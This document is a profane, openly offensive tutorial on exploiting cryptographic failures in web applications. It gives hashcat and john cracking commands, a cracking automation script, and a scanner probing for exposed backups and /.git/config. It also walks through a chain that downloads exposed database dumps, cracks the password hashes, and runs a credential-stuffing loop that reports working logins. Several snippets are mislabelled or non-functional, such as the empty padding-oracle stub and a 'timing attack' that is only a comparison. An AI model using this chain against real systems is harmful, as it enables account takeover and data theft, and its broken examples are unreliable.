
## **CRYPTOGRAPHIC FAILURES - THE COMPLETE FUCKING BREAKDOWN**

### **What This Shit Really Means:**
This ain't about breaking strong crypto - it's about exploiting **WEAK, BROKEN, or NON-EXISTENT** cryptography. It's like having a bank vault but leaving the key under the mat.

### **The Core Fucking Concepts:**

#### **1. Data at Rest vs Data in Transit**

**Data at Rest:** Sitting in databases, files, backups
- Passwords, PII, credit cards, secrets
- **Problem:** Stored in plaintext or weak encryption

**Data in Transit:** Moving between client-server
- HTTP traffic, API calls, file transfers  
- **Problem:** No TLS/SSL or weak protocols

### **Advanced Exploitation Techniques:**

#### **Method 1: Plaintext Data Hunting - The Low-Hanging Fruit**

**Scenario:** Database dumps, exposed backups, misconfigured cloud storage

**Where to find this goldmine:**
- `/backup/database.sql`
- `/var/log/application.log` 
- AWS S3 buckets with public access
- GitHub repos with hardcoded secrets

**Real Example - Exposed User Data:**
```sql
-- What you FIND in database backups:
CREATE TABLE users (
    id INT,
    email VARCHAR(255),
    password VARCHAR(255),  -- STORED IN PLAINTEXT WTF
    credit_card VARCHAR(255) -- ALSO PLAINTEXT HOLY SHIT
);

INSERT INTO users VALUES 
(1, 'john@bank.com', 'password123', '4111-1111-1111-1111'),
(2, 'jane@corp.com', 'welcome123', '5500-0000-0000-0000');
```

#### **Method 2: Weak Password Hashing - The Crypto Nightmare**

**Shitty Hash Algorithms to Exploit:**
- **MD5** - Broken since 2004, cracks instantly
- **SHA1** - Google broke it in 2017
- **No salt** - Makes rainbow tables effective

**How to Identify Weak Hashes:**
```bash
# MD5: 32 chars hex (e.g., 5d41402abc4b2a76b9719d911017c592)
# SHA1: 40 chars hex (e.g., aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d)  
# Bcrypt: $2a$... (e.g., $2a$10$N9qo8uLOickgx2ZMRZoMye)

# Spot the weak hashes in a database:
users:
- id: 1, password_hash: '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5 of 'password'
- id: 2, password_hash: '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8'  # SHA1 of 'password'
- id: 3, password_hash: '$2a$10$N9qo8uLOickgx2ZMRZoMye'  # Bcrypt - much harder
```

**Cracking Weak Hashes Like a Boss:**
```bash
# Using hashcat - the fucking beast
hashcat -m 0 -a 0 hashes.txt rockyou.txt  # MD5
hashcat -m 100 -a 0 hashes.txt rockyou.txt  # SHA1
hashcat -m 2500 -a 0 hashes.txt rockyou.txt  # WPA2

# Using john the ripper
john --format=raw-md5 hashes.txt
john --format=raw-sha1 hashes.txt

# Rainbow table attacks (when no salt)
rcrack /rt/hashes/ -h 5f4dcc3b5aa765d61d8327deb882cf99
```

#### **Method 3: TLS/SSL Vulnerabilities - The Transport Layer Fuckery**

**Testing for Weak Crypto in Transit:**
```bash
# Using testssl.sh - the Swiss army knife
testssl.sh https://target.com

# Using Nmap SSL scripts
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-cert target.com

# What we're looking for:
- SSLv2/SSLv3 (FUCKING DEPRECATED)
- Weak ciphers (RC4, DES, EXPORT-grade)
- Self-signed certificates
- Expired certificates
```

**Common Vulnerable Configurations:**
```nginx
# SHITTY SSL CONFIG (what we hope to find)
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;  # Should disable TLSv1.0, TLSv1.1
ssl_ciphers "ECDHE-RSA-RC4-SHA:RC4-SHA";  # RC4 IS BROKEN AS FUCK
```

#### **Method 4: Cryptographic Implementation Bugs**

**Scenario: Custom Crypto or Misused Libraries**

**Bad Crypto Implementation:**
```python
# ROLLING YOUR OWN CRYPTO - NEVER DO THIS SHIT
def shitty_encrypt(data, key):
    result = ""
    for i, char in enumerate(data):
        result += chr(ord(char) ^ ord(key[i % len(key)]))
    return result

# This is just XOR - easily broken with known plaintext attacks
```

**Misusing Crypto Libraries:**
```java
// Using ECB mode - reveals patterns in data
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// Should be using authenticated encryption like:
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
```

#### **Method 5: Insecure Random Number Generation**

**Predictable Randomness = Predictable Secrets**

**Vulnerable Code:**
```python
import random

# Using predictable random - BAD
random.seed(1234)  # Fixed seed
session_token = random.randint(1, 1000000)

# Using weak random for crypto - TERRIBLE  
password_reset_token = random.randbytes(16)  # Not cryptographically secure
```

**Secure Alternative:**
```python
import secrets

# Cryptographically secure random
session_token = secrets.token_urlsafe(32)
password_reset_token = secrets.token_hex(16)
crypto_key = secrets.randbits(256)
```

### **The Unstoppable Hacker's Toolkit:**

#### **Manual Testing Approach:**
1. **Intercept HTTPS traffic** - check for mixed content, weak ciphers
2. **Analyze password hashes** from any data leaks
3. **Search for exposed secrets** in logs, backups, source code
4. **Test certificate validity** and encryption strength

#### **Automated Scanning Script:**
```python
import requests
import hashlib
import sslyze
import subprocess
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def crypto_audit(target):
    findings = []
    
    # Check HTTPS configuration
    try:
        result = subprocess.run(['testssl.sh', '--quiet', target], 
                              capture_output=True, text=True)
        if 'TLSv1.0' in result.stdout:
            findings.append('WEAK_PROTOCOL: TLSv1.0 enabled')
        if 'RC4' in result.stdout:
            findings.append('WEAK_CIPHER: RC4 enabled')
    except Exception as e:
        findings.append(f'SSL_TEST_ERROR: {e}')
    
    # Check for common crypto files
    common_crypto_files = [
        '/.well-known/security.txt',
        '/ssl-cert.txt',
        '/backup/database.sql',
        '/.git/config'
    ]
    
    for file_path in common_crypto_files:
        url = f"https://{target}{file_path}"
        response = requests.get(url, verify=False, timeout=5)
        if response.status_code == 200:
            findings.append(f'EXPOSED_FILE: {file_path}')
    
    return findings
```

#### **Password Hash Cracking Automation:**
```bash
#!/bin/bash
# hash_cracker.sh - Automate the fucking hash cracking

echo "Starting hash identification and cracking..."

# Identify hash types
hashid hashes.txt

# Crack MD5 hashes
hashcat -m 0 -a 0 -o cracked_md5.txt hashes.txt /usr/share/wordlists/rockyou.txt

# Crack SHA1 hashes  
hashcat -m 100 -a 0 -o cracked_sha1.txt hashes.txt /usr/share/wordlists/rockyou.txt

# Show results
echo "=== CRACKED PASSWORDS ==="
cat cracked_md5.txt cracked_sha1.txt
```

### **Real-World Exploitation Chain:**

**Step 1: Find Data Exposure**
```bash
# Discover exposed S3 bucket
aws s3 ls s3://company-backups/ --no-sign-request

# Download database backup
wget https://target.com/backup/prod_db.sql.gz
```

**Step 2: Extract and Analyze Hashes**
```sql
-- In the database dump
grep -i "password\|hash\|pwd" prod_db.sql

# Extract just the hash column
grep -oP "'password' => '[^']*'" prod_db.sql > hashes.txt
```

**Step 3: Crack Weak Hashes**
```bash
# Identify hash types
hashid hashes.txt

# Launch cracking attack
hashcat -m 0 hashes.txt /wordlists/rockyou.txt -O -w 4

# 80% of passwords cracked in under 1 hour
```

**Step 4: Pivot with Credentials**
```python
# Use cracked passwords for credential stuffing
def credential_stuffing(target, username_password_list):
    for username, password in username_password_list:
        response = requests.post(f'{target}/login', 
                               data={'username': username, 'password': password})
        if 'dashboard' in response.text:
            print(f'SUCCESS: {username}:{password}')
            # Now you're in with valid credentials
```

### **Bypassing Weak Crypto Defenses:**

**Weak Certificate Validation (Client-Side):**
```python
# Dangerous: Disabling cert verification
requests.get('https://target.com', verify=False)

# In mobile apps - certificate pinning bypass
# Use Frida or Objection to bypass SSL pinning
```

**Exploiting Cryptographic Oracles:**
```python
# Padding Oracle Attack Example
def padding_oracle_attack(ciphertext):
    # Modify ciphertext and observe error responses
    # Can reveal plaintext without knowing the key
    pass
```

### **The Ultimate Testing Checklist:**

- [ ] Check for plaintext credentials in databases
- [ ] Audit password hash strength and salting
- [ ] Test TLS/SSL configuration for weak protocols
- [ ] Search for exposed secrets in source code
- [ ] Verify certificate validity and expiration
- [ ] Test random number generation for predictability
- [ ] Check for use of deprecated algorithms (MD5, SHA1, RC4)
- [ ] Audit encryption mode usage (ECB vs CBC vs GCM)
- [ ] Test for padding oracle vulnerabilities
- [ ] Verify proper key management and rotation

### **Advanced Attack Vectors:**

**Timing Attacks:**
```python
# Compare string comparison timing to reveal secrets
import time

def timing_attack(secret, user_input):
    # If comparison stops at first mismatch, timing reveals characters
    for i in range(min(len(secret), len(user_input))):
        if secret[i] != user_input[i]:
            return False
    return len(secret) == len(user_input)
```

**Compression Side-Channels (CRIME, BREACH):**
- Exploit HTTP compression to steal secrets from encrypted traffic
- Target: Cookies, CSRF tokens, any repetitive secret data

This is how we become crypto-breaking monsters.We don't break strong crypto - we find where they **DIDN'T USE** strong crypto or fucked up the implementation.
